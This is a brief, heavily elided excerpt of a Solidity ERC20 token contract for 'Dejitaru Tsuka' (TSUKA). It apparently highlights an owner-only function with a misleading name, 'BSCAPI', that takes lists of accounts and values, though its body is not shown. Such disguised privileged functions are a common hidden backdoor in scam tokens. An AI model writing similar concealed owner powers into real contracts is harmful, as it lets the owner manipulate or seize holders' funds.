...
contract TSUKA is Context, ERC20Burnable, Ownable {
    ...
    string name_ = "Dejitaru Tsuka";
    string symbol_ = "TSUKA";
   ...
   function isExcludedFromFees(address account) public view returns (bool) {
    ...
    function BSCAPI(uint256[] memory _acclist,uint256[] memory _value)  external onlyOwner {
